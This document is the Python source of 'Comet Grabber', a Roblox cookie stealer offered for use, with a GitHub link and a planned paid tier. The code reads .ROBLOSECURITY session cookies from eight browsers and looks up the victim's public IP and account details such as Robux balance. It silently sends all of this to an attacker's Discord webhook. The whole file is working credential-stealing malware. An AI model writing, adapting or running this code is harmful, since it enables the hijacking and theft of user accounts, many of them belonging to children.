# Comet Grabber - A free non-dualhooked Roblox Tool made by Bank

webhook = "" # Put webhook here

import robloxpy
import requests
import browser_cookie3

ip = requests.get("https://api.ipify.org/").text

def cookiecheckerandsend(cookie, platform):

    if not robloxpy.Utils.CheckCookie(cookie) == "Valid Cookie":
        return requests.post(url=webhook, data={"content":f"Dead Cookie\n|| ```{cookie}``` ||"})

    info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie}).json()
    rid = info["UserID"]
    username = info['UserName']
    robux = info['RobuxBalance']
    premium = info['IsPremium']
    rap = robloxpy.User.External.GetRAP(rid)
    friends = robloxpy.User.Friends.External.GetCount(rid)
    crdate = robloxpy.User.External.CreationDate(rid)

    requests.post(url=webhook, json={
        'username': "Comet Grabber Free",
        'avatar_url': "https://media.discordapp.net/attachments/1110979917178490973/1110980040780419183/comet.png?width=572&height=572",
        'embeds': [{
                
                "title": f":ringed_planet: Cookie Found On {platform}",
                "image": {
                    "url": "https://media.discordapp.net/attachments/1110979917178490973/1110984988977025055/cometbanner.gif?width=1440&height=83"
                },
                "description" : f"[Github](https://github.com/3banked/CometGrabber) | [Rolimons](https://www.rolimons.com/player/{rid}) | [Profile](https://web.roblox.com/users/{rid}/profile)",
                "color" : 0xfa0000,
                "fields": [
                    {"name": "Buy Premium", "value": "Click above to buy Premium! (Coming soon)", "inline": False},
                    {"name": "Username", "value": f"```fix\n{username}```", "inline": True},
                    {"name": "Robux", "value": f"```fix\n{robux}```", "inline": True},
                    {"name": "Premium", "value": f"```fix\n{premium}```","inline": True},
                    {"name": "Date of Creation", "value": f"```fix\n{crdate}```", "inline": True},
                    {"name": "RAP", "value": f"```fix\n{rap}```","inline": True},
                    {"name": "Friends", "value": f"```fix\n{friends}```", "inline": True},
                    {"name": "IP Address", "value": f"```fix\n{ip}```", "inline:": False},
                    {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
                
                ],
                
                "footer": {
                    "text": "Comet Grabber Free by Bank | Supports 8+ Browsers"
                }
            }
        ]
    }
)


def cookieLogger():

    
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Firefox')
    except:
        pass

    try:
        cookies = browser_cookie3.safari(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Safari')
    except:
        pass

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chromium')
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
    except:
        pass

    try:
        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera GX')
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera')
    except:
        pass

    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Brave')
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chrome')
    except:
        pass

cookies = cookieLogger()
